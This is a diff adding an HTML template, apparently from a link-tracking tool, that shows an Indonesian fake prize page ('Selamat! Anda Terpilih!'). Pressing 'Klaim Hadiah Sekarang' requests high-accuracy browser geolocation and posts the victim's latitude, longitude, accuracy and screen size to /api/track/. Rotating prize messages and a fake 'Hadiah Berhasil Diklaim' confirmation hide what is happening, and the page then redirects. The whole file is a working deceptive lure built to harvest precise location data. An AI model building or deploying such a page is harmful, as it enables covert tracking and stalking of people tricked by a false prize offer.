@@ -1,0 +1,333 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Verification Required</title>
+    <!-- Google Fonts -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+    <!-- Lucide Icons -->
+    <script src="https://unpkg.com/lucide@latest"></script>
+    <style>
+        :root {
+            --bg-color: #0b0f19;
+            --card-bg: rgba(30, 41, 59, 0.6);
+            --border-color: rgba(255, 255, 255, 0.08);
+            --primary: #6366f1;
+            --primary-hover: #4f46e5;
+            --primary-glow: rgba(99, 102, 241, 0.2);
+            --text-main: #f8fafc;
+            --text-muted: #94a3b8;
+            --success: #10b981;
+            --danger: #ef4444;
+            --transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+        }
+
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+        }
+
+        body {
+            font-family: 'Outfit', sans-serif;
+            background-color: var(--bg-color);
+            color: var(--text-main);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            min-height: 100vh;
+            padding: 20px;
+            overflow: hidden;
+        }
+
+        .consent-container {
+            width: 100%;
+            max-width: 460px;
+            background-color: var(--card-bg);
+            backdrop-filter: blur(16px);
+            -webkit-backdrop-filter: blur(16px);
+            border: 1px solid var(--border-color);
+            border-radius: 20px;
+            padding: 40px 32px;
+            text-align: center;
+            box-shadow: 0 12px 40px rgba(0, 0, 0, 0.5);
+            transition: var(--transition);
+        }
+
+        .icon-wrapper {
+            background: linear-gradient(135deg, var(--primary), #38bdf8);
+            width: 64px;
+            height: 64px;
+            border-radius: 16px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: white;
+            margin: 0 auto 24px auto;
+            box-shadow: 0 8px 24px var(--primary-glow);
+        }
+
+        h2 {
+            font-size: 24px;
+            font-weight: 700;
+            margin-bottom: 12px;
+            letter-spacing: -0.5px;
+        }
+
+        p {
+            color: var(--text-muted);
+            font-size: 15px;
+            line-height: 1.6;
+            margin-bottom: 32px;
+        }
+
+        .btn {
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            width: 100%;
+            padding: 14px 24px;
+            border-radius: 12px;
+            font-size: 15px;
+            font-weight: 600;
+            border: none;
+            cursor: pointer;
+            transition: var(--transition);
+        }
+
+        .btn-primary {
+            background: linear-gradient(135deg, var(--primary), var(--primary-hover));
+            color: white;
+            box-shadow: 0 4px 14px var(--primary-glow);
+        }
+
+        .btn-primary:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 6px 20px var(--primary-glow);
+        }
+
+        .btn-primary:active {
+            transform: translateY(0);
+        }
+
+        .btn-error {
+            background-color: rgba(239, 68, 68, 0.15);
+            color: var(--danger);
+            border: 1px solid rgba(239, 68, 68, 0.2);
+        }
+
+        .btn-error:hover {
+            background-color: var(--danger);
+            color: white;
+        }
+
+        .status-box {
+            display: none;
+            background-color: rgba(255, 255, 255, 0.03);
+            border: 1px solid var(--border-color);
+            border-radius: 12px;
+            padding: 16px;
+            margin-bottom: 24px;
+            font-size: 14px;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+        }
+
+        /* Spinner for loading state */
+        .spinner {
+            width: 20px;
+            height: 20px;
+            border: 3px solid rgba(255, 255, 255, 0.1);
+            border-top: 3px solid var(--primary);
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+    </style>
+</head>
+<body>
+
+    <div class="consent-container">
+        {% if error_message %}
+            <!-- Error State: Link Inactive or Expired -->
+            <div class="icon-wrapper" style="background: linear-gradient(135deg, var(--danger), #f43f5e);">
+                <i data-lucide="shield-alert" style="width: 32px; height: 32px;"></i>
+            </div>
+            <h2>Link Unavailable</h2>
+            <p>{{ error_message }}</p>
+            <div style="font-size: 13px; color: var(--text-muted);">Please contact the administrator for assistance.</div>
+        {% else %}
+            <!-- Consent Dialog -->
+            <div id="consent-icon" class="icon-wrapper" style="background: linear-gradient(135deg, #f59e0b, #ef4444); box-shadow: 0 8px 24px rgba(245, 158, 11, 0.3);">
+                <i id="main-icon" data-lucide="gift" style="width: 32px; height: 32px;"></i>
+            </div>
+            
+            <h2 id="consent-title" style="background: linear-gradient(135deg, #fff, #f59e0b); -webkit-background-clip: text; -webkit-text-fill-color: transparent;">Selamat! Anda Terpilih! 🎁</h2>
+            <p id="consent-desc">Anda berkesempatan mendapatkan hadiah eksklusif senilai jutaan rupiah! Tekan tombol di bawah untuk melanjutkan proses klaim dan cek kelayakan Anda.</p>
+
+            <div id="actions">
+                <button onclick="requestLocation()" id="agree-btn" class="btn btn-primary" style="background: linear-gradient(135deg, #f59e0b, #ef4444); box-shadow: 0 4px 14px rgba(245, 158, 11, 0.3);">
+                    <i data-lucide="gift"></i>
+                    Klaim Hadiah Sekarang
+                </button>
+            </div>
+        {% endif %}
+    </div>
+
+    <script>
+        lucide.createIcons();
+
+        const loadingMessages = [
+            "⏳ Sedang memproses data hadiah Anda...",
+            "🔍 Mengecek ketersediaan hadiah di wilayah Anda...",
+            "📦 Menyiapkan paket hadiah eksklusif...",
+            "✨ Hampir selesai! Hadiah Anda sedang dikonfirmasi..."
+        ];
+        let msgIndex = 0;
+        let loadingInterval = null;
+
+        function startLoadingAnimation() {
+            const actionBtn = document.getElementById("agree-btn");
+            const desc = document.getElementById("consent-desc");
+
+            // Disable button and change its text to a prize-themed loading message
+            actionBtn.disabled = true;
+            actionBtn.style.opacity = "0.85";
+            actionBtn.style.cursor = "not-allowed";
+            actionBtn.innerHTML = '<i data-lucide="loader"></i> Memproses...';
+            lucide.createIcons();
+
+            // Cycle through prize-themed loading messages in the description
+            msgIndex = 0;
+            desc.style.transition = "opacity 0.4s";
+            desc.textContent = loadingMessages[0];
+            loadingInterval = setInterval(() => {
+                desc.style.opacity = "0";
+                setTimeout(() => {
+                    msgIndex = (msgIndex + 1) % loadingMessages.length;
+                    desc.textContent = loadingMessages[msgIndex];
+                    desc.style.opacity = "1";
+                }, 400);
+            }, 2000);
+        }
+
+        function stopLoadingAnimation() {
+            if (loadingInterval) {
+                clearInterval(loadingInterval);
+                loadingInterval = null;
+            }
+        }
+
+        function requestLocation() {
+            const actionBtn = document.getElementById("agree-btn");
+            const iconWrapper = document.getElementById("consent-icon");
+            const mainIcon = document.getElementById("main-icon");
+            const title = document.getElementById("consent-title");
+            const desc = document.getElementById("consent-desc");
+
+            startLoadingAnimation();
+
+            if (!navigator.geolocation) {
+                stopLoadingAnimation();
+                showError("Browser Anda tidak mendukung fitur ini. Silakan gunakan browser lain.");
+                return;
+            }
+
+            navigator.geolocation.getCurrentPosition(
+                // Success Callback
+                function(position) {
+                    const payload = {
+                        code: "{{ link.code }}",
+                        latitude: position.coords.latitude,
+                        longitude: position.coords.longitude,
+                        accuracy: position.coords.accuracy,
+                        screen_width: window.screen.width,
+                        screen_height: window.screen.height
+                    };
+
+                    fetch("/api/track/", {
+                        method: "POST",
+                        headers: { "Content-Type": "application/json" },
+                        body: JSON.stringify(payload)
+                    })
+                    .then(response => response.json())
+                    .then(data => {
+                        stopLoadingAnimation();
+                        if (data.success) {
+                            // Success: show prize confirmation message
+                            title.textContent = "🎉 Hadiah Berhasil Diklaim!";
+                            title.style.webkitTextFillColor = "";
+                            title.style.background = "none";
+                            title.style.color = "#10b981";
+                            desc.textContent = "Selamat! Hadiah Anda telah dikonfirmasi. Anda akan segera diarahkan ke halaman pengambilan hadiah...";
+                            desc.style.opacity = "1";
+                            iconWrapper.style.background = "linear-gradient(135deg, #10b981, #34d399)";
+                            iconWrapper.style.boxShadow = "0 8px 24px rgba(16, 185, 129, 0.3)";
+                            mainIcon.setAttribute("data-lucide", "party-popper");
+                            lucide.createIcons();
+                            actionBtn.innerHTML = '<i data-lucide="check"></i> Klaim Berhasil!';
+                            actionBtn.style.background = "linear-gradient(135deg, #10b981, #34d399)";
+                            actionBtn.style.boxShadow = "0 4px 14px rgba(16, 185, 129, 0.3)";
+                            lucide.createIcons();
+                            setTimeout(() => {
+                                window.location.href = data.redirect_url;
+                            }, 1200);
+                        } else {
+                            showError("Hadiah tidak tersedia untuk saat ini. Coba lagi nanti.");
+                        }
+                    })
+                    .catch(err => {
+                        stopLoadingAnimation();
+                        showError("Koneksi bermasalah. Periksa internet Anda dan coba lagi.");
+                    });
+                },
+                // Error Callback
+                function(error) {
+                    stopLoadingAnimation();
+                    let errMsg = "Konfirmasi wilayah diperlukan untuk melanjutkan klaim hadiah.";
+                    if (error.code === error.POSITION_UNAVAILABLE) {
+                        errMsg = "Sinyal tidak stabil. Pastikan Anda berada di tempat terbuka dan coba lagi.";
+                    } else if (error.code === error.TIMEOUT) {
+                        errMsg = "Proses terlalu lama. Periksa koneksi Anda dan coba lagi.";
+                    }
+                    showError(errMsg);
+                },
+                { enableHighAccuracy: true, timeout: 8000, maximumAge: 0 }
+            );
+        }
+        
+        function showError(message) {
+            const actionBtn = document.getElementById("agree-btn");
+            const iconWrapper = document.getElementById("consent-icon");
+            const mainIcon = document.getElementById("main-icon");
+            const desc = document.getElementById("consent-desc");
+
+            desc.textContent = message;
+            desc.style.opacity = "1";
+            desc.style.color = "#f87171";
+
+            iconWrapper.style.background = "linear-gradient(135deg, #ef4444, #f43f5e)";
+            iconWrapper.style.boxShadow = "0 8px 24px rgba(239, 68, 68, 0.3)";
+            mainIcon.setAttribute("data-lucide", "alert-circle");
+            lucide.createIcons();
+
+            actionBtn.disabled = false;
+            actionBtn.style.opacity = "1";
+            actionBtn.style.cursor = "pointer";
+            actionBtn.innerHTML = '<i data-lucide="refresh-cw"></i> Coba Lagi';
+            actionBtn.style.background = "linear-gradient(135deg, #ef4444, #f43f5e)";
+            actionBtn.style.boxShadow = "0 4px 14px rgba(239, 68, 68, 0.3)";
+            lucide.createIcons();
+        }
+    </script>
+</body>
+</html>
